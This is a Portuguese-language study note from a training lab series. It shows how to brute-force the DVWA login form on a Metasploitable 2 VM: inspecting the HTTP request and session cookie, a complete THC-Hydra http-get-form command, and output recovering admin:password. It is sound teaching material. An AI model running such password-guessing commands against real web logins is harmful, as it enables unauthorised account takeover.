---
title: "04 - Força Bruta Web no DVWA"
tags:
  - web-security
  - dvwa
  - hydra
  - brute-force
  - http
created: 2024-11-17
type: guide
status: completed
---

# 🌐 04 - Força Bruta Web no DVWA

> [!abstract] Objetivo do Módulo
> Automatizar tentativas de login em uma aplicação web com controle de sessão HTTP utilizando o DVWA (*Damn Vulnerable Web Application*), compreendendo por que ataques web exigem tratamento de cookies e identificação de strings de resposta.

---

## 1. Contexto do DVWA no Metasploitable 2

1. No navegador do Kali Linux, acesse: `http://192.168.56.101/dvwa/`.
2. Efetue login inicial com as credenciais padrão: `admin` / `password`.
3. Navegue até **DVWA Security** e selecione o nível **Low** (baixo).
4. Clique em **Brute Force** no menu lateral (`/dvwa/vulnerabilities/brute/`).

> [!screenshot] Registro Visual Recomendado
> Capture a interface do formulário de login no DVWA e salve em `attachments/`:
> ![[04_dvwa_bruteforce_form.png|750]]
> *Figura 4: Formulário de autenticação do módulo Brute Force no DVWA.*

---

## 2. Inspeção da Requisição HTTP (Inspecionar Elemento)

Ao digitar um login incorreto (`admin` / `teste`), a ferramenta do desenvolvedor (*F12 > Network / Rede*) revela:

- **Método HTTP:** `GET`
- **URL Completa:** `http://192.168.56.101/dvwa/vulnerabilities/brute/?username=admin&password=teste&Login=Login`
- **Mensagem de Erro:** `<pre><br />Username and/or password incorrect.</pre>`
- **Cookies de Sessão:** `Cookie: security=low; PHPSESSID=7b34bdf8872e457788190d78b871c53e`

> [!warning] O Desafio da Autenticação Web
> Servidores HTTP respondem com status **200 OK** tanto quando o login dá certo quanto quando falha.
> A ferramenta de auditoria **precisa saber qual texto na página indica erro** para continuar testando!

---

## 3. Automação com THC-Hydra

Como explicado nas aulas, o **THC-Hydra** possui a melhor sintaxe para formulários web com cookies:

```bash
hydra -l admin -P wordlists/passwords_common.txt 192.168.56.101 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=7b34bdf8872e457788190d78b871c53e"
```

### Decomposição do Módulo `http-get-form`:
- `^USER^` e `^PASS^`: Variáveis substituídas dinamicamente a cada tentativa.
- `F=Username and/or password incorrect.`: String de **Falha** (*Failure*). Se esse texto estiver no HTML retornado, a senha estava errada.
- `H=Cookie: ...`: Envia a sessão PHP ativa; sem isso, a requisição seria redirecionada para a tela de login principal do DVWA.

---

## 4. Resultado da Execução

```text
Hydra v9.5 (c) 2023 by van Hauser / THC & David Maciejak
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9 login tries
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "123456"
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "password"
[80][http-get-form] host: 192.168.56.101   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

> [!success] Credencial Validada
> O login para a aplicação web é `admin:password`.

---

## 🔗 Próximo Passo
- Avançar para: [[05 - Enumeração e Password Spraying em SMB]]
